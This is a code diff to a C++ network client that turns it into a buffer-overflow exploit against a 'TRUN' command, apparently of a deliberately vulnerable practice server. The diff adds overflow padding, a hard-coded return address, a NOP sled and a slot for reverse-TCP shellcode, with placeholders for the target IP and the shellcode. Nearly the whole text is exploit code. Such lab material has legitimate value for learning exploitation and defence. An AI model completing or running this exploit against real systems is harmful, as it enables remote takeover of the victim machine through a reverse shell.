@@ -38,7 +38,7 @@ int main(int argc, char* argv[])
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
 
-    iResult = getaddrinfo("you ip", DEFAULT_PORT, &hints, &result);
+    iResult = getaddrinfo("ip", DEFAULT_PORT, &hints, &result);
     if (iResult != 0) {
         printf("getaddrinfo failed with error: %d\n", iResult);
         WSACleanup();
@@ -75,9 +75,18 @@ int main(int argc, char* argv[])
     }
 
 	std::string message = "TRUN .";
+    std::string reverseTCP =
+        "your reverseTCP";
 
-    for (int i = 0; i < 2008; ++i)
+    for (int i = 0; i < 2006; ++i)
         message += 'A';
+
+    message += "\xAF\x11\x50\x62"; // -- eesfunc.dll
+
+    for (int i = 0; i < 16; ++i)
+        message += '\x90';
+
+    message += reverseTCP;
 
     iResult = send( ConnectSocket, message.c_str(), message.size(), 0);
     if (iResult == SOCKET_ERROR) {
